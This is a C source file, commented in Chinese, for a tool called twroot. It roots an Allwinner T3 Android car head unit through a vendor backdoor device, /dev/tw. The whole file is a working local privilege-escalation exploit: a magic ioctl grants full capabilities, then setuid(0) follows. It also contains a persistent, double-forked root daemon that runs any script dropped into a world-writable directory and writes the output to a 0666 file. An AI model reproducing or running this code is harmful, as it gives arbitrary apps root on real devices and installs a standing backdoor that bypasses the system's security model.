/*
 * twroot —— 利用厂商 /dev/tw 后门注入 capability 拿 root 的小工具。
 *
 * 背景
 * ----
 * 这台车机（Allwinner T3 / Android 4.4.2 / 内核 3.10.65）的 BSP 里带一个
 * 字符设备 /dev/tw（crw-rw-rw- root root 247,0），任何 uid 都能打开。
 * 对它发一个 ioctl(fd, _IO(0x61,0xff), 0xa55aa55a)，内核会把调用进程的
 *   cap_inheritable / cap_permitted / cap_effective
 * 全部写成 0xffffffff（cap_bounding 不变）。
 * 于是一个普通 app 进程（uid 10055）立刻具备 CAP_SETUID，setuid(0) 成功。
 *
 * 判据
 * ----
 * 必须看 setuid(0) 和 getuid()/geteuid()，**不能**只看 ioctl 的返回值：
 * ioctl 返回 0 只说明内核认了这个魔数，不代表本进程真的拿到了 capability。
 *
 * 用法
 * ----
 *   twroot --check              只自检，不执行命令（返回 0 = 后门可用）
 *   twroot <cmd> [args...]      以 root 执行一条命令（execvp，不返回）
 *   twroot --daemon <workdir>   以 root 常驻，轮询 <workdir>/rcmd.sh 执行
 *
 * 编译
 * ----
 *   arm-linux-gnueabihf-gcc -static -O2 -o twroot twroot.c
 *
 * 守护进程协议
 * ------------
 *   外部写入   <workdir>/rcmd.tmp   然后 mv 成 <workdir>/rcmd.sh（原子交付）
 *   守护进程   mv rcmd.sh -> rcmd.run
 *              sh rcmd.run >> <workdir>/rs_out.txt
 *              追加 ##EXIT=<code>##\n
 *              rm rcmd.run
 *   输出文件必须是 0666，否则调用方（uid 10055）读不到 root 建出来的文件。
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <signal.h>
#include <time.h>
#include <dirent.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>

#define TW_DEV        "/dev/tw"
#define TW_IOCTL      _IO(0x61, 0xff)     /* == 0x61ff */
#define TW_IOCTL_ARG  0xa55aa55aUL

#define POLL_MS       2000                /* 轮询间隔 */
#define CMD_MAX_SECS  600                 /* 单条命令最长运行时间，防堵死 */
#define OUT_NAME      "rs_out.txt"
#define PID_NAME      ".pid"

/* ---------------------------------------------------------------- 提权 */

static int gain_root(void)
{
    int fd = open(TW_DEV, O_RDWR);
    if (fd < 0) {
        fprintf(stderr, "twroot: open(%s): %s\n", TW_DEV, strerror(errno));
        return -1;
    }

    long r = ioctl(fd, TW_IOCTL, TW_IOCTL_ARG);
    int saved = errno;
    close(fd);
    if (r < 0) {
        fprintf(stderr, "twroot: ioctl(0x%04x): %s\n",
                (unsigned)TW_IOCTL, strerror(saved));
        return -1;
    }

    /* capability 到手后 cap_effective 里就有 CAP_SETUID/CAP_SETGID 了 */
    if (setgid(0) != 0) {
        fprintf(stderr, "twroot: setgid(0): %s\n", strerror(errno));
        return -1;
    }
    if (setuid(0) != 0) {
        fprintf(stderr, "twroot: setuid(0): %s\n", strerror(errno));
        return -1;
    }
    if (getuid() != 0 || geteuid() != 0) {
        fprintf(stderr, "twroot: 提权失败 uid=%d euid=%d\n", (int)getuid(), (int)geteuid());
        return -1;
    }
    return 0;
}

/* --------------------------------------------------------------- 小工具 */

static void sleep_ms(long ms)
{
    struct timespec ts;
    ts.tv_sec = ms / 1000;
    ts.tv_nsec = (ms % 1000) * 1000000L;
    nanosleep(&ts, NULL);
}

static int file_exists(const char *p)
{
    struct stat st;
    return stat(p, &st) == 0;
}

/* 读 pid 文件并判断那个进程是不是还活着且确实是 twroot */
static pid_t daemon_alive(const char *workdir)
{
    char path[512], buf[64];
    snprintf(path, sizeof(path), "%s/%s", workdir, PID_NAME);

    int fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    ssize_t n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = 0;

    pid_t pid = (pid_t)atoi(buf);
    if (pid <= 0) return 0;

    char cmdp[64];
    snprintf(cmdp, sizeof(cmdp), "/proc/%d/cmdline", (int)pid);
    fd = open(cmdp, O_RDONLY);
    if (fd < 0) return 0;
    n = read(fd, buf, sizeof(buf) - 1);
    close(fd);
    if (n <= 0) return 0;
    buf[n] = 0;

    return strstr(buf, "twroot") ? pid : 0;
}

static void write_pid(const char *workdir)
{
    char path[512];
    snprintf(path, sizeof(path), "%s/%s", workdir, PID_NAME);
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0666);
    if (fd < 0) return;
    char buf[32];
    int n = snprintf(buf, sizeof(buf), "%d\n", (int)getpid());
    if (write(fd, buf, n) < 0) { /* 忽略 */ }
    close(fd);
    chmod(path, 0666);
}

/* 确保输出文件存在且 0666（root 建的 0600 会让调用方读不到） */
static void ensure_out(const char *workdir)
{
    char path[512];
    snprintf(path, sizeof(path), "%s/%s", workdir, OUT_NAME);
    int fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0666);
    if (fd >= 0) close(fd);
    chmod(path, 0666);
}

/* ------------------------------------------------------------ 守护进程 */

/*
 * 跑一条命令，最多等 CMD_MAX_SECS 秒。
 * 不用 alarm()/信号 —— 轮询 waitpid(WNOHANG) 更简单，也不干扰子进程。
 */
static int run_script(const char *workdir, const char *outpath)
{
    pid_t c = fork();
    if (c < 0) {
        fprintf(stderr, "twroot: fork: %s\n", strerror(errno));
        return -1;
    }
    if (c == 0) {
        int fd = open(outpath, O_WRONLY | O_CREAT | O_APPEND, 0666);
        if (fd >= 0) {
            dup2(fd, STDOUT_FILENO);
            dup2(fd, STDERR_FILENO);
            if (fd > 2) close(fd);
        }
        if (chdir(workdir) != 0) { /* 无所谓，下面用文件名 */ }
        execl("/system/bin/sh", "sh", "rcmd.run", (char *)NULL);
        execl("/bin/sh", "sh", "rcmd.run", (char *)NULL);
        _exit(127);
    }

    int status = 0;
    long waited = 0;
    for (;;) {
        pid_t w = waitpid(c, &status, WNOHANG);
        if (w == c) break;
        if (w < 0) { status = -1; break; }
        if (waited >= CMD_MAX_SECS * 10L) {
            kill(c, SIGKILL);
            waitpid(c, &status, 0);
            return -2;                  /* 超时 */
        }
        sleep_ms(100);
        waited++;
    }
    if (status == -1) return -1;
    if (WIFEXITED(status)) return WEXITSTATUS(status);
    if (WIFSIGNALED(status)) return 128 + WTERMSIG(status);
    return -1;
}

static int daemon_main(const char *workdir)
{
    if (gain_root() != 0) return 2;

    /* 已经有一个在跑就别起第二个（两个都轮询会抢 rcmd.sh） */
    pid_t old = daemon_alive(workdir);
    if (old > 0) {
        fprintf(stderr, "twroot: 守护进程已在运行 pid=%d\n", (int)old);
        return 0;
    }

    /* 双 fork + setsid：脱离 app 进程组，app 被杀也不跟着死 */
    pid_t p1 = fork();
    if (p1 < 0) return 3;
    if (p1 > 0) _exit(0);               /* 父进程立刻退出，调用方不会卡住 */

    if (setsid() < 0) { /* 继续，不是致命错误 */ }

    pid_t p2 = fork();
    if (p2 < 0) _exit(3);
    if (p2 > 0) _exit(0);

    signal(SIGHUP, SIG_IGN);
    signal(SIGPIPE, SIG_IGN);

    if (chdir(workdir) != 0) {
        fprintf(stderr, "twroot: chdir(%s): %s\n", workdir, strerror(errno));
        return 4;
    }

    /*
     * 三个标准流全部接到 /dev/null。
     * 只换 stdin 是不够的：调用方（app）用管道读我们的输出，只要守护进程
     * 还攥着写端，父进程就永远等不到 EOF，会一路卡到超时才返回。
     * 命令自己的输出由子进程重新打开 rs_out.txt 再 dup2，不依赖这里。
     */
    int nullfd = open("/dev/null", O_RDWR);
    if (nullfd >= 0) {
        dup2(nullfd, STDIN_FILENO);
        dup2(nullfd, STDOUT_FILENO);
        dup2(nullfd, STDERR_FILENO);
        if (nullfd > 2) close(nullfd);
    }

    ensure_out(workdir);
    write_pid(workdir);

    char outpath[512];
    snprintf(outpath, sizeof(outpath), "%s/%s", workdir, OUT_NAME);

    for (;;) {
        if (file_exists("rcmd.sh")) {
            /* mv 是原子的：要么看到完整文件，要么看不到 */
            if (rename("rcmd.sh", "rcmd.run") == 0) {
                int code = run_script(workdir, outpath);
                int fd = open(outpath, O_WRONLY | O_CREAT | O_APPEND, 0666);
                if (fd >= 0) {
                    char tail[64];
                    int n = snprintf(tail, sizeof(tail), "##EXIT=%d##\n", code);
                    if (write(fd, tail, n) < 0) { /* 忽略 */ }
                    close(fd);
                }
                unlink("rcmd.run");
            }
        }
        sleep_ms(POLL_MS);
    }
    return 0;
}

/* ---------------------------------------------------------------- main */

static void usage(const char *argv0)
{
    fprintf(stderr,
        "用法:\n"
        "  %s --check                 自检后门是否可用\n"
        "  %s <cmd> [args...]         以 root 执行命令\n"
        "  %s --daemon <workdir>      以 root 常驻，轮询 <workdir>/rcmd.sh\n",
        argv0, argv0, argv0);
}

int main(int argc, char **argv)
{
    if (argc < 2) { usage(argv[0]); return 2; }

    if (!strcmp(argv[1], "--check")) {
        if (gain_root() != 0) return 1;
        printf("OK uid=%d euid=%d gid=%d\n", (int)getuid(), (int)geteuid(), (int)getgid());
        return 0;
    }

    if (!strcmp(argv[1], "--daemon")) {
        if (argc < 3) { usage(argv[0]); return 2; }
        return daemon_main(argv[2]);
    }

    if (gain_root() != 0) return 1;
    execvp(argv[1], &argv[1]);
    fprintf(stderr, "twroot: execvp(%s): %s\n", argv[1], strerror(errno));
    return 127;
}
